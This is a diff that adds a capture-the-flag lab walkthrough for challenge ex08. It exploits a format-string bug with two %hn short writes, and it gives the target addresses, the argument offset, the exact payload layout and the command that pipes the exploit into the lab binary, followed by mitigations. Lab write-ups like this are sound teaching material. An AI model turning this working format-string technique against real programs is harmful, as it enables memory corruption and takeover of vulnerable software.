@@ -484,8 +484,52 @@ an **arbitrary write**: the attacker chooses both the address (placed in the buf
 
 ---
 
-<!-- ex08 … ex11 walkthroughs are added as each challenge is completed. -->
-_ex08 … ex11: in progress._
+### ex08 — format string: large value via two `%hn` short writes
+
+**Goal (`README.txt`):** see *“you have modified the target :)”*.
+
+**Vulnerability class:** format-string vulnerability (CWE-134), same bug as ex07 but now writing a
+**large, specific value** — demonstrating the *short-write* technique.
+
+**Disassembly (`vuln`):** `fgets(buf,0x200,stdin)` → `printbuffer(buf)` which does `printf(buf)` →
+`if (target == 0x01025544) puts("you have modified the target :)")`. `target` is at `0x080496f4`.
+
+**Why it's harder than ex07:** the required value `0x01025544` ≈ 16.9 million. A single `%n`
+would need to print ~17M characters. Instead we write the value **16 bits at a time** with `%hn`:
+
+| write | value | address |
+|-------|-------|---------|
+| high half | `0x0102` | `target+2 = 0x080496f6` |
+| low half  | `0x5544` | `target   = 0x080496f4` |
+
+**Offset:** the extra `printbuffer` frame pushes the buffer to `printf` argument **#12**
+(`AAAA%12$x` → `AAAA41414141`).
+
+**Exploit (`scripts/ex08.py`):** place both target addresses at the buffer start, then write the
+**smaller** half first so the cumulative `%n` counter only grows:
+
+```
+[&target+2][&target] %250c%12$hn %21570c%13$hn
+ 8 chars -> +250 = 258 = 0x0102 -> target+2
+         -> +21570 = 21828 = 0x5544 -> target
+=> target = 0x01025544
+```
+
+```bash
+python3 scripts/ex08.py | /opt/hole-in-bin/ex08/bin
+```
+
+**Result (verified):** `you have modified the target :)`.
+
+**Key takeaway:** `%hn`/`%hhn` let an attacker write a full 32-bit value in 16- or 8-bit pieces
+with only modest output, so "the value is too big to print" is **not** a mitigation. Remove the
+bug (`printf("%s", buf)`); defense-in-depth: FORTIFY (`%n` in writable-memory format strings is
+rejected under `_FORTIFY_SOURCE`).
+
+---
+
+<!-- ex09 … ex11 walkthroughs are added as each challenge is completed. -->
+_ex09 … ex11: in progress._
 
 ---
 
